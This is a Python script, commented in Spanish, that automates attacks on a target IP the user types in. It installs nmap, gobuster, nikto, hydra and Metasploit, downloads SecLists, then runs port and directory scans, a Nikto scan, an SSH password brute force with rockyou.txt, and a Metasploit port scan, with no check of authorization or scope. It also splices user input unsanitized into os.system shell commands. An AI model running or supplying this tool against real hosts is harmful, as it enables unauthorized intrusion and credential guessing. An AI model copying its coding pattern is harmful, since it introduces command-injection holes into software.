import os
import subprocess
import urllib.request

# Instalación de herramientas necesarias
def install_tools():
    os.system("sudo apt update")
    os.system("sudo apt install -y nmap gobuster nikto hydra metasploit-framework")
    os.system("sudo msfdb init")

# Descarga de diccionarios
def download_dictionaries():
    url = "https://github.com/danielmiessler/SecLists/archive/master.zip"
    urllib.request.urlretrieve(url, "SecLists-master.zip")
    os.system("unzip SecLists-master.zip -d SecLists")

# Escaneo de puertos con Nmap
def scan_ports(target):
    os.system(f"nmap -sV -oN nmap_scan.txt {target}")

# Detección de directorios con Gobuster
def gobuster_scan(target):
    os.system(f"gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt")

# Análisis de vulnerabilidades con Nikto
def nikto_scan(target):
    os.system(f"nikto -h http://{target} -o nikto_results.txt")

# Fuerza bruta con Hydra
def hydra_bruteforce(target, user):
    os.system(f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target}")

# Escaneo de puertos con Metasploit
def metasploit_scan(target):
    os.system("msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS {} ; set PORTS 1-65535; run; exit'".format(target))

# Ejecución del script
if __name__ == "__main__":
    target = input("Enter the target IP: ")
    user = input("Enter the username for SSH brute force: ")

    install_tools()
    download_dictionaries()
    
    print("Starting Nmap scan...")
    scan_ports(target)
    
    print("Starting Gobuster scan...")
    gobuster_scan(target)
    
    print("Starting Nikto scan...")
    nikto_scan(target)
    
    print("Starting Hydra brute force...")
    hydra_bruteforce(target, user)
    
    print("Starting Metasploit port scan...")
    metasploit_scan(target)
    
    print("All tasks completed.")
